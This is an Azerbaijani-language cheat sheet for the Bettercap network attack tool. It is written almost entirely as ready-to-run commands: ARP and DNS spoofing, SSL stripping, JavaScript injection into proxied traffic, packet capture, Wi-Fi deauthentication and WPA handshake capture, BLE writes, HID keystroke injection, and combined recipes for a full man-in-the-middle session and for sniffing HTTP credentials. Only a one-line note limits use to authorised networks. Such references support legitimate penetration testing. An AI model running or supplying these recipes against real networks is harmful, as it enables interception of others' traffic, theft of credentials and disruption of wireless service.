# Bettercap Cheat Sheet

> **Bettercap** — şəbəkə hücumları, kəşfiyyat və MITM əməliyyatları üçün güclü, modul əsaslı alət.

---

## Quraşdırma

```bash
# Debian/Ubuntu
sudo apt install bettercap

# macOS (Homebrew)
brew install bettercap

# Go ilə mənbədən
go install github.com/bettercap/bettercap@latest

# Caplet yeniləmə
sudo bettercap -eval "caplets.update; quit"
```

---

## Başlatma

```bash
# Sadə başlatma
sudo bettercap

# İnterfeys təyin etmək
sudo bettercap -iface eth0

# Caplet ilə başlatma
sudo bettercap -caplet /path/to/file.cap

# Skript ilə başlatma
sudo bettercap -eval "net.probe on; net.recon on"

# Web UI ilə başlatma
sudo bettercap -caplet http-ui
```

---

## İnteraktiv Shell

| Əmr | Təsvir |
|-----|--------|
| `help` | Bütün modulları göstər |
| `help <modul>` | Modul haqqında məlumat |
| `set <param> <dəyər>` | Parametr təyin et |
| `get <param>` | Parametr dəyərini oxu |
| `!<shell əmri>` | Shell əmri icra et |
| `quit` / `exit` | Çıx |
| `clear` | Ekranı təmizlə |

---

## Şəbəkə Kəşfiyyatı

```
# Aktiv hostları tara
net.probe on

# Canlı hostları izlə
net.recon on

# Hostların siyahısı
net.show

# Hədəf IP-ni sil
net.clear

# Müəyyən host haqqında məlumat
net.show.meta 192.168.1.1
```

### Faydalı Parametrlər

```
set net.probe.throttle 10        # Prob arasında gecikmə (ms)
set net.recon.period  30         # Yenidən skan dövrü (saniyə)
```

---

## ARP Spoofing (MITM)

```
# Bütün şəbəkəyə ARP spoofing
arp.spoof on

# Yalnız müəyyən hədəfə
set arp.spoof.targets 192.168.1.10
arp.spoof on

# Spoofing dayandır
arp.spoof off

# Full-duplex (hər iki tərəf)
set arp.spoof.fullduplex true
arp.spoof on
```

---

## DNS Spoofing

```
# Bütün domenlər üçün yönləndir
set dns.spoof.all true
set dns.spoof.address 192.168.1.100
dns.spoof on

# Müəyyən domenləri yönləndir
set dns.spoof.domains example.com,google.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# Dayandır
dns.spoof off
```

---

## HTTP/HTTPS Proxy

```
# HTTP proxy başlat
http.proxy on

# HTTPS proxy (SSL Strip)
https.proxy on

# Xüsusi port
set http.proxy.port 8080
http.proxy on

# Injektor ilə
set http.proxy.injectjs http://192.168.1.1/script.js
http.proxy on
```

### HTTP Sniffer

```
# HTTP trafiki izlə
http.show on

# Yalnız POST sorğuları
set http.show.filter post
http.show on
```

---

## Paket Sniffing

```
# Bütün paketləri yaz
net.sniff on

# Fayla yaz (pcap)
set net.sniff.output capture.pcap
net.sniff on

# Verbose rejim
set net.sniff.verbose true
net.sniff on

# Filter (BPF sintaksisi)
set net.sniff.filter "tcp port 80"
net.sniff on

# Dayandır
net.sniff off
```

---

## WiFi (802.11)

```
# WiFi kəşfiyyatı başlat
wifi.recon on

# Şəbəkələri göstər
wifi.show

# Deauth hücumu (AP-yə)
wifi.deauth <BSSID>

# Bütün müştərilər üçün deauth
wifi.deauth ff:ff:ff:ff:ff:ff

# WPA Handshake əldə et
set wifi.handshakes.file /tmp/handshakes
wifi.recon on

# AP-yə bağlan
wifi.assoc <BSSID>

# Kəşfi dayandır
wifi.recon off
```

### WiFi Parametrləri

```
set wifi.interface wlan0mon       # Monitor mode interfeys
set wifi.region US                # Bölgə təyin et
set wifi.txpower 30               # Ötürmə gücü (dBm)
```

---

## BLE (Bluetooth Low Energy)

```
# BLE kəşfiyyatı
ble.recon on

# BLE cihazları göstər
ble.show

# Cihaza qoşul
ble.connect <MAC>

# GATT xidmətlərini oxu
ble.enum <MAC>

# Xüsusi xarakteristikaya yaz
ble.write <MAC> <UUID> <hex_data>

# Dayandır
ble.recon off
```

---

## HID (USB/Bluetooth Klaviatura Hücumu)

```
# HID injektor başlat
hid.inject on

# Payload göndər
hid.inject.payload <payload_fayl>

# Fərdi düymə göndər
hid.inject.key <key_kodu>
```

---

## Caplet-lər (Skript Faylları)

Caplet — `.cap` uzantılı bettercap skripti.

```bash
# Standart capletlər siyahısı
sudo bettercap -eval "caplets.show; quit"

# Caplet icra et
sudo bettercap -caplet pita.cap

# İnteraktiv rejimdə icra
> caplets.run myscript.cap
```

### Nümunə Caplet (`mitm.cap`)

```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

---

## Events (Hadisə Sistemi)

```
# Bütün hadisələri göstər
events.show

# Müəyyən sayda göstər
events.show 20

# Hadisələri təmizlə
events.clear

# Canlı izlə
events.stream on
```

---

## Web UI

```bash
# Web UI başlat (default: localhost:80)
sudo bettercap -caplet http-ui

# Xüsusi port
set api.rest.port 8083
set api.rest.username admin
set api.rest.password mypassword
api.rest on
```

Brauzer: `http://localhost/`

---

## REST API

```bash
# API aktiv et
set api.rest.address 0.0.0.0
set api.rest.port 8081
api.rest on

# Sorğu nümunələri
curl http://localhost:8081/api/session
curl http://localhost:8081/api/events
curl -X POST http://localhost:8081/api/session \
     -H "Content-Type: application/json" \
     -d '{"cmd": "net.show"}'
```

---

## Faydalı Birləşmə Nümunələri

### Tam MITM Sessiyası
```
net.probe on
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on
set net.sniff.verbose false
set net.sniff.output /tmp/traffic.pcap
net.sniff on
```

### WiFi Şifrə Toplama
```
set wifi.handshakes.file /root/handshakes
wifi.recon on
# Hədəf SSID görünəndə:
wifi.deauth <BSSID>
```

### HTTP Credential Sniffer
```
set arp.spoof.targets 192.168.1.10
arp.spoof on
set http.show.filter post
http.show on
http.proxy on
```

---

## Qısa Klaviatura Əmrləri

| Əmr | Açıqlama |
|-----|----------|
| `Ctrl + C` | Cari modulu dayandır |
| `Tab` | Avtomatik tamamlama |
| `↑ / ↓` | Əmr tarixçəsi |
| `Ctrl + L` | Ekranı təmizlə |

---

## Qeydlər

- Bettercap **root/sudo** icazəsi tələb edir.
- WiFi modulları üçün interfeys **monitor modda** olmalıdır (`airmon-ng start wlan0`).
- SSL Strip üçün `https.proxy` + `arp.spoof` birlikdə istifadə edin.
- Bütün testlər yalnız **icazəli şəbəkələrdə** aparılmalıdır.

---

*Mənbə: https://www.bettercap.org/docs/*
